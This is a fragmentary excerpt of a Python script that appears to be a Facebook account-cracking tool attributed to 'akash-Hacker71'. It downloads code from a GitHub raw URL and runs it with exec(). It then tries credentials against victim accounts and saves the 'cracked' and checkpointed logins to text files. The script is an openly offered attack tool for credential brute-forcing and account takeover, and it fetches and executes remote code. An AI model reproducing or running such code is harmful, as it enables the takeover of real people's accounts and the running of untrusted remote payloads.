...
rs=requests.session()
rg=rs.get
x=(rg("https://raw.githubusercontent.com/akash-Hacker71/akash-Hacker71/main/info.py").text)
exec(x)
##### LOGO #####
...
{rcl}[+] This Script From akash-Hacker71 ...
...
if Permission=="On":
  ...
  motion(ccl+"You Need akash-Hacker71's Permission")
  time.sleep(2)
  ...
  def main(arg):
    try:
      ...
      if 'access_token' in q:
        motion (ccl+'\n[akash_OK] ' + victim + '  |  ' + line+"\n")
        okb = open('save/akash_Successful.txt', 'a')
        okb.write(victim +" [ akash ] "+ line + '\n')
        okb.close()
        motion(ccl+"\nCreacked Account In Save File...\n")       
      elif 'www.facebook.com' in q['error_msg']:
        motion( ycl+'\n[akash_CP] ' +victim+'  |  '+ycl + line+"\n")
        cps = open('save/akash_CheckPoint.txt', 'a')
        cps.write(victim +" [ akash ] "+ line + '\n')
        cps.close()
        motion(ccl+"\nCreacked Account In Save File...\n")
